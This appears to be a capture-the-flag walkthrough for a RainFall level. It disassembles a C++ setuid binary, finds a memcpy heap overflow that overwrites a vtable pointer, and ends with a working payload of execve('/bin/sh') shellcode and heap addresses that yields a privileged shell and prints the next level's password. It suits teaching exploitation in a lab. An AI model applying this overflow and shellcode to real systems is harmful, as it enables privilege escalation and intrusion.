# Level 9

## Introduction

Going back to *PEDA* as we used it way more on this one.

Explanation on the reverse engineering part will be focusing on the aspects useful for exploiting:
- C++ what's new
- N::annotation
- What's in EDX

## Setup

We find a binary file at the root of the user **`level9`** named *`./level9`*.

We run
```bash
git clone https://github.com/longld/peda.git /etc/peda
```

To analyze the binary file we copy PEDA in the vm with `scp` *(OpenSSH secure file copy)*.
```bash
scp -r -P 4243 /tmp/peda level9@localhost:/tmp
```

### PEDA

We start an ssh connection
```bash
ssh -p 4243 level1@localhost
```

And after using /home/user/level1/.pass as the password, we open GDB on /home/user/level1/level1.
In order to use `PEDA` we have to manually change the source in gdb to peda.py that we copied.
```bash
> gdb /home/user/level1/level1
(gdb)> source /tmp/peda/peda.py
```

## Binary Analysis

On the `PEDA` prompt we need to run a couple of commands to analyze the binary.
In order to develop an exploit, we want to understand the behaviour of the program.

We run the usual `info functions` command.

<pre>
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
</pre>

A few of the symbols follow the syntax: "N::{FUNCTION_NAME}()".
You guessed it, it is probably a Class.

### C++ What's new?

So we'll start as usual by looking at the `main` function.
But In order to understand this main, we'll split it in three parts matching the [Binary Analysis](#binary-analysis) sections:

- [C++ what's new](#c-whats-new) from <+0> to <+87>
- [N::annotation](#nannotation) from <+92> to <+131>
- [What's in EDX](#whats-in-edx) from <+136> to <+165>

Here is the first section of the `main`.

<pre>
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	<span style="color:#FF0000">cmp    DWORD PTR [ebp+0x8],0x1</span>
   0x08048602 <+14>:	<span style="color:#FF0000">jg     0x8048610 <main+28></span>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	<span style="color:#FFFF00">call   0x80484f0 <_exit@plt></span>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	<span style="color:#00FF00">call   0x8048530 <_Znwj@plt></span>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	<span style="color:#00FF00">call   0x80486f6 <_ZN1NC2Ei></span>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	<span style="color:#00FF00">call   0x8048530 <_Znwj@plt></span>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	<span style="color:#00FF00">call   0x80486f6 <_ZN1NC2Ei></span>
   <span style="color:#696969">0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.</span>
</pre>

It contains:

<details>
<summary>A procedure prologue In which we know we get 0x20 == 32 bits of space on the stack.</summary>
<pre>
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
</pre>
We get 0x20, or 32 bytes of stack for the main.
</details>

<details>
<summary>A check for at least one argument.</summary>
<pre>
   0x080485fe <+10>:	<span style="color:#FF0000">cmp    DWORD PTR [ebp+0x8],0x1</span>
   0x08048602 <+14>:	<span style="color:#FFFF00">jg     0x8048610 <main+28></span>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	<span style="color:#00FF00">call   0x80484f0 <_exit@plt></span>
</pre>
Here, [ebp+0x8] contains argc.
The code will skip the exit with the `jg` if argc > 1
</details>

<details>
<summary>And twice almost the same code</summary>
<table>
<tr>
<th>new N(5)</th>
<th>new N(6)</th>
</tr>
<tr>
<td>
<pre>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	<span style="color:#00FF00">call   0x8048530 <_Znwj@plt></span>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	<span style="color:#00FF00">call   0x80486f6 <_ZN1NC2Ei></span>
</pre>
</td>
<td>
<pre>
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	<span style="color:#00FF00">call   0x8048530 <_Znwj@plt></span>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	<span style="color:#00FF00">call   0x80486f6 <_ZN1NC2Ei></span>
</pre>
</td>
</tr>
</table>
What we'll note here is the call to functions with a weird name.
In C++, to facilitate features like overloading, <a href="https://www.ibm.com/docs/en/i/7.5?topic=linkage-name-mangling-c-only">function names are mangled</a>.

In fact, here we have calls to `new` with `_Znwj@plt` and `N::N(int)` with `_ZN1NC2Ei`.

The second one can be justified with the parameters used and its implementation.

Its first argument is the last  element on the stack, here the content of `ebx`.
As `ebx` contains `eax` after the call to `new`, it is the address in the memory for the instance.
It first receives `this`.
And its second argument is `6` as we can see in `esp+0x4`.

But more important can be found for later in the instruction of the constructor function.

<pre>
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   ebp
   0x080486f7 <+1>:	mov    ebp,esp
   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
   0x0804870b <+21>:	pop    ebp
   0x0804870c <+22>:	ret
End of assembler dump.
</pre>

with the push instruction, ebp is now 8 bytes from esp when the `call` in the main occures.
In esp was stored the address of the new object.

But the first instruction after getting the address in `eax` is weird.
`0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848` effectively puts a constant value in the object.

A quick command `x 0x8048848` in PEDA to examine what's at this address gives `0x0804873a`.
Or `0x0804873a` is the address of a function when we did the command `info functions`.
It is the address of the `N::operator+(N&)` function.
In fact, in C++, instances contain a pointer to a virtual table `vtable` which stores the address of all of the member functions.
`0x8048848` is the address of this vtable.

Then we get the second parameter from `ebp+0xc` (5 for the first call, 6 for the second), and we store it at `eax+0x68`.
Or 0x68 is equal to 104, and we called `new` for 108 bytes.
So the int is stored at the end of the instance's space.
We got: `'&vtable', 100 bytes, int`.
</details>

<br/>
<b>
We now know how the main starts.
That we have a C++ class with a 100 bytes of space, and an int.
And that we got two instances of the class.
</b>

### N::annotation

Lets continue with the main up to the next call to a member function from N.

<pre>
<span style="color:#696969">
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei></span>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	<span style="color:#00FF00">call   0x804870e <_ZN1N13setAnnotationEPc></span>
   <span style="color:#696969">0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.</span>
</pre>

The first few instructions from <+92> to <128> are mostly some memory shuffle.
The important points are:

- <+112> we put the second argument of `main` argv[0] in eax
- <+118> we skip the 4 first bytes, we are on argv[1]
- <+120> we put that at `esp+0x4` which will be `ebx+0xc` in the next `call`
    |-> second parameter of `_ZN1N13setAnnotationEPc` is argv[1]

- <+128> at `esp` we put `eax` which contains `[esp+0x14]` which contains `[esp+0x1c]` which is the return value of `new`
    |-> first parameter of `_ZN1N13setAnnotationEPc` is `&instance1`

Now in the function itself.

<pre>
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	<span style="color:#00FF00">call   0x8048520 <strlen@plt></span>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:	add    edx,0x4
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
   0x08048733 <+37>:	<span style="color:#FF0000">call   0x8048510 <memcpy@plt></span>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.
</pre>

We see `strlen@plt` called on `argv[1]` and the result used for `memcpy@plt` as the third parameter.
Morover, `argv[1]` is used for `memcpy@plt` as the second parmeter which means `argv[1]` is the source.

And we copy the entirety of `argv[1]` in the space 0x4 after the begining of our current instance.
We know it has a fixed size of a 100 bytes and `memcpy@plt` does not receive the size of the destination.

We so can write the memory from 4 bytes after the begining of our first instance, or right after the `vtable` address.
And we already know we got the memory for a second instance with `new`.
We might be able to overwrite the second instance's data.

### What's in EDX

Is the data from the second instance used?
If we overwrite the data for the second instance, the `vtable` should be corrupted.

So any try to use a member function would effectively call at an address we could choose.
And as `vtable` sits as the first element of the instance, any dereferencing of our second instance first address is a vulnerability.

<pre>
<span style="color:#696969">
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc></span>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	<span style="color:#00FF00">call   edx</span>
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
</pre>

At <+108> `esp+0x10` was set to contain the address of the second instance of class N.
And right after the calal to `_ZN1N13setAnnotationEPc`, we put in eax this address.
Then at <+140> we dereference eax in place. It allows us to access the instance itself.
But at <+142> the critical mistake is done. There is no way back, we dereference again.

This effectively dereference the first element which is the `vtable` address, and accesses the first element of the table which normally is the first member funcion.
`edx` should point towards the instructions of `N::operator+(int)`

However, after setting the other parameters for the next `call` statement, we notice that the instructions used are the ones in `edx`.
This, in a normal context executes the `N::operator+(int)` of the second instance with the first instance as a parameter.

<b>We got all of the pieces to reconstruct the source, and probably about enough to write our payload.</b>

### Source

The equivalent program in C would be:
```C++
#include <cstring>
#include <cstdlib>

class N {
public:
    char buffer[100];
    int value;

    N(int value) : value(value) {}

    void setAnnotation(char* annotation) {
        int len = strlen(annotation);

        std::memcpy(this->buffer, annotation, len);
    }

    int operator+(const N &right) const {
        return (this->value + right.value);
    }

    int operator-(const N &right) const {
        return (this->value - right.value);
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        exit(1);
    }

    N* instance1 = new N(5);
    N* instance2 = new N(6);

    instance1->setAnnotation(argv[1]);

    return (*instance2 + *instance1);
}
```

### Permissions
As we can see in the permissions of the executable file, the binary `./level9` is executed with the privileges of the user **bonus0**, the owner of the file.
```bash
level9@RainFall:~$ ls -l level9
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

## Exploit

We now know:
- the binary has user **level9** privileges
- we can overflow an address that will be used as a pointer to pointer to instructions (`vtable`, table of address of functions)
- the second instance address is our target

We'll use the `pattern create` + `pattern offset` combo to calculate the size of our payload.

```bash
pattern create 124
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9'
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9'
```

The program tried to dereference `'MAAi'` which is at an offset of 108.

<details>
<summary>We are left with the same steps as for the level2</summary>
<span style="color:#696969">
When we login, we see a message saying that *ASLR* is off:
```bash
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
```
This can be useful to us if we want to try to inject *shellcode* on the heap, because the memory location where `strdup` allocates never changes (`0x0804a008`).

We can find *shellcodes* from [shell-storm](https://shell-storm.org/shellcode/index.html), [exploit-db](https://www.exploit-db.com/) or even github.

The one I will be using is an [execve ("/bin/sh")](https://shell-storm.org/shellcode/files/shellcode-752.html) of 21 bytes.
```assembly
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 mov al, 11
 int 0x80
```
Translated to:

```
char code[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\xb0\x0b\xcd\x80";
```

With this we can prepare our payload. To be able to execute the payload we have to write the instructions (*shellcode*) on the **heap** and tell the program to execute that.

We can achieve this by replacing the main's `return` address by the memory location where `strdup` writes, that way the input from the `gets` function is allocated on the **heap** thanks to `strdup` and we can execute it by telling the program that the next instruction on the EIP (instead of the `return`) is on the address `0x0804a008`.

We will have this format: *shellcode* + padding + *heap address*.
</span>
</details>

But this time we have to remember that our address get dereferenced a second time.
So we'll add another *heap address* at the very begining of our payload.

*heap address + 4* + *shellcode* + *83 times 'a'* + *heap address*

This will be the payload for our binary.
```bash
"\x10\xa0\x04\x08\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0c\xa0\x04\x08"
```

### Solution

We can execute the buffer overflow with this line.
```bash
$ ./level9 $(printf "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0c\xa0\x04\x08")
1���Qh//shh/bin��

cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
